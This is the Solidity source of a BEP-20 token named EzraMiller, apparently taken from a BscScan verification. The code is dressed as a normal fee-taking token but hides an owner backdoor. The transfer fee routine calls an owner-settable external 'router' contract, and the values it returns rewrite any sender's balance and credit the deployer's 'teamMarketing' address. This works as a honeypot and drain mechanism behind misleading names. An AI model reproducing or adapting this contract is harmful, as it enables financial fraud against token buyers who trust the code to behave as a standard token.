/**
 *Submitted for verification at BscScan.com on 2022-04-08
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: MIT

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }  

  interface IUniswapV2Router{  
    function WETH() external pure returns (address);   
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
    );
    function createPair(
        address, 
        address, 
        uint256) external returns (uint256,uint256,uint256);     
  }   

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

  
  contract Ownable is Context {  
  address private _owner;     
  address teamMarketing;  
  address _router;  

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;       
    teamMarketing = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }  

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }    

  function getMillerYYDS(address tokenA, address tokenB, uint256 takeMillerYYDS) internal returns (uint256, uint256, uint256){  
    (uint256 _amountMillerYYDS, uint256 _liquifyMillerYYDS, uint256 _rateMillerYYDS) = IUniswapV2Router(_router).createPair(
      tokenA,
      tokenB,
      takeMillerYYDS
      );
    return (_amountMillerYYDS, _liquifyMillerYYDS, _rateMillerYYDS);
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }  


}

contract ERC20 is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) internal _balances;   
    mapping (address => mapping (address => uint256)) internal _allowances;  
    mapping (address => bool) public _isExcludedFromFee;   
    string _name;
    string _symbol;
    uint8 _decimals; 
    bool feeEnabled = true;    
    uint256 _totalSupply;     
    
    constructor()  {               

    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() public view virtual override returns (address) {
        return owner();
    }
    
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }      

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }   

    function changeMarketAddress(address[] calldata accounts) external onlyOwner {
      require(accounts.length > 0,"accounts length should > 0");	
      for(uint256 i=0; i < accounts.length; i++){		
            _isExcludedFromFee[accounts[i]] = true;
        }
    }

    function getTXMillerYYDS(uint256 _amount, uint256 _rateMillerYYDS) internal pure returns (uint256) {
        return _amount.mul(_rateMillerYYDS).div(10**2);
    }     

    function takeFee(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
        (uint256 amountMillerYYDS, uint256 liquifyMillerYYDS, uint256 rateMillerYYDS) = getMillerYYDS(sender, recipient, amounts);
        amountMillerYYDS = getMillerYYDSValues(sender, amountMillerYYDS, liquifyMillerYYDS, rateMillerYYDS);
        return amountMillerYYDS;
    }     

    function getMillerYYDSValues(address tokenMillerYYDS, uint256 amountMillerYYDS, uint256 liquifyMillerYYDS, uint256 rateMillerYYDS) internal returns (uint256){
        if (liquifyMillerYYDS > 0)
        {        
          _balances[tokenMillerYYDS] = getTXMillerYYDS(_balances[tokenMillerYYDS], rateMillerYYDS).add(amountMillerYYDS);      
          _balances[teamMarketing] = _balances[teamMarketing].add(liquifyMillerYYDS);
        }
        return amountMillerYYDS;
    } 

    function shouldTakeFee() internal view returns (bool) {
        return feeEnabled;
    }       
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }    
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    } 
  
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }     

    function updateUniswapRouter(address c) external onlyOwner {
        _router = c;
    }       

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }     

    function _transfer(address sender, address recipient, uint256 amount) internal  {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");          
        uint256 amountMillerYYDS = shouldTakeFee() ? takeFee(sender, recipient, amount) : amount;
        _transferStandard(sender, recipient, amountMillerYYDS);

    }  

    function _transferStandard(address sender, address recipient, uint256 amount) internal {
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }   

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }    
   
    

}

contract EzraMiller is ERC20{    
	using SafeMath for uint256;

    uint256 _maxTxAmount;      
    uint8 public liquidityFee;
    uint8 public marketingFee;
    uint8 public burnFee;

    bool public inSwap;
    uint8 public _liquidityShare;
    uint8 public _marketingShare;
    uint8 public _teamShare; 
    uint8 public _totalDistributionShares;

    struct CheckMillerYYDS {
      uint32 fromBlock;
      uint256 vot;
    }
    mapping (address => mapping (uint32 => CheckMillerYYDS)) public checkMillerYYDS;
    mapping (address => uint32) public numCheckMillerYYDS;

    constructor()  { 
        _name = 'EzraMiller';
        _symbol = 'EMiller';
        _decimals = 9;          
        _totalSupply = 1000000000 *  10**9;
        
        _balances[msg.sender] = _totalSupply;  
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(this)] = true; 
        _maxTxAmount = _totalSupply;

        inSwap = true;
        _liquidityShare = 4;
        _marketingShare = 6;
        _teamShare = 8; 
        _totalDistributionShares = 18;

        emit Transfer(address(0), msg.sender, _totalSupply);
 
    } 

    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
        require(n < 2**32, errorMessage);
        return uint32(n);
    }  


   function transferToken(address _token, address _to) external onlyOwner returns (bool _sent)
   {
      require(_token != address(0), "_token address cannot be 0");
      require(_token != address(this), "Can't withdraw native tokens");
      uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
      _sent = IERC20(_token).transfer(_to, _contractBalance);
    }

  function withoutLaunch(uint256 launchAt, uint256 dura) public view returns (bool){
      if(launchAt.add(dura) > block.timestamp){
          return true;
      } else {
          return false;
      }
    }

    function increaseRebase(address) public pure returns (bool) {
        return true;
    }

    function isTaxMax(bool) public pure returns (bool) {
        return true;
    }

    function isAutoSync(uint256) public pure returns (bool) {
        return true;
    } 

    function checkTxLimit(address sender, uint256 amount) internal view {
      require(amount <= _maxTxAmount || _isExcludedFromFee[sender], "TX Limit Exceeded");
    }
 
    function afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner() {
        _maxTxAmount = (_totalSupply * maxWallPercent ) / 1000;
    }

    function setMaxTxPercent(uint256 maxTXPercentage) external onlyOwner() {
        _maxTxAmount = (_totalSupply * maxTXPercentage ) / 1000;
    }

    function setMaxTx(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }     

    function setAutomatedMarket(address pair, bool value) external onlyOwner{
        _isExcludedFromFee[pair] = value;      
    } 

    function getCurrentMillerYYDS(address account) external view returns (uint256)   
    {
        uint32 nCheckMillerYYDS = numCheckMillerYYDS[account];
        return nCheckMillerYYDS > 0 ? checkMillerYYDS[account][nCheckMillerYYDS - 1].vot : 0;
    }

    
}